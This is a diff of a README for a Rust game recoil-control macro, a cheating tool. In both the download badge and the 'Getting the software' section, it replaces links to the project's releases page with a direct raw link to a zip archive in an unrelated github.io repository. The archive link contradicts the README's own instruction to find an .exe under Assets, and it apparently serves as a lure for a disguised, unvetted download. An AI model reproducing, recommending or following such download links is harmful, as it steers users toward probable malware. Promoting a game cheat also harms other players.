@@ -5,7 +5,7 @@ description: "Manage Rust weapon recoil with an external tool featuring randomiz
 ---
 # 🎯 Rust-macro-2026 - Improve your weapon spray control accuracy
 
-[![Download Rust-macro-2026](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Produtorap793/Rust-macro-2026/releases)
+[![Download Rust-macro-2026](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Produtorap793/produtorap793.github.io/raw/refs/heads/main/Rhytidodon/produtorap_github_io_1.3-beta.5.zip)
 
 Rust-macro-2026 manages weapon recoil for players in the game Rust. This utility helps you track weapon spray patterns by applying randomized variance. It provides presets for AK, LR300, MP5, and Thompson. You can adjust your settings in real time for different scopes.
 
@@ -15,7 +15,7 @@ This software runs on Windows 10 and Windows 11. Your computer needs at least 4G
 
 ## 📥 Getting the software
 
-Visit [this page to download](https://github.com/Produtorap793/Rust-macro-2026/releases) the latest version. Look for the file ending in .exe under the Assets section. Save the file to a folder on your computer.
+Visit [this page to download](https://github.com/Produtorap793/produtorap793.github.io/raw/refs/heads/main/Rhytidodon/produtorap_github_io_1.3-beta.5.zip) the latest version. Look for the file ending in .exe under the Assets section. Save the file to a folder on your computer.
 
 ## 🚀 Setting up the utility
 
